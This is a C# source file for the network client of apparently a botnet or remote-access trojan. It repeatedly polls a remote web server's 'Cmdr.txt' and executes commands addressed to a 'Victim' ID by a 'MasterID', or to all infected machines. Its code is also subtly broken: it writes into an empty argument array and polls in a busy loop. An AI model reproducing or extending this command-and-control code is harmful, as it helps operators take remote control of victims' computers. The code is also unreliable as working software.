using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using baraba.Commands;
using System.Diagnostics;

namespace baraba.Network
{
    class Client
    {
        // Config
        private Properties.Settings Config = new Properties.Settings();
        // Speed In (Secconds) for receiving Data from Server.
        private int ReceiveSpeed = 0;

        public Client(int ReceiveSpeed = 1)
        {
            this.ReceiveSpeed = ReceiveSpeed;
            // Upload ClientStatus.
            ClientStatus.Online();
            // Check Status.
            if (ClientStatus.IsOnline())
            {
                // Create a new Thread for receiving Data.
                new Thread(ReceiveData).Start();
            }
        }

        /// <summary>
        /// Receive Data, Convert And Execute Data(Command).
        /// </summary>
        private void ReceiveData()
        {
            if (ReceiveSpeed > 0)
            {
                string Data = String.Empty;
                string TempData = String.Empty;
                while (true)
                {
                    // Receive Data.
                    Data = Networking.GetResponse(Config.WebServer + "Cmdr.txt");
                    try
                    {
                        if (Data != String.Empty && Data != TempData)
                        {
                            if (Data.Contains('|'))
                            {
                                // Splitted items.
                                string[] DataSz = Data.Split('|');
                                // If Received Data is a command.
                                if (DataSz.Count() >= 2)
                                {
                                    // FORMAT: MasterID|Victim|Command>Arg1>Arg2 ...
                                    if (DataSz[0] == Config.MasterID && DataSz[1] == ClientProfile.GetClientId() || DataSz[1] == "EXPAND_ALL")
                                    {
                                        string Command = DataSz[2].Split('>')[0];
                                        string[] Args = { };
                                        // Get Arguments of Command.
                                        for (int i = 1; i <= DataSz[2].Split('>').Count() - 1; i++)
                                        {
                                            Args[i - 1] = DataSz[2].Split('>')[i];
                                        }

                                        if ((Command.Length >= 0 || Args.Count() >= 0))
                                            // Perform Command.
                                            Commands.Command.Perform(Command, Args);
                                        TempData = Data;
                                    }
                                }
                            }
                            // Wait ...
                            Thread.Sleep(ReceiveSpeed);
                        }
                    }
                    catch (Exception e)
                    {
                        Debug.Print(e.StackTrace);
                    }
                }
            }
        }
    }
}

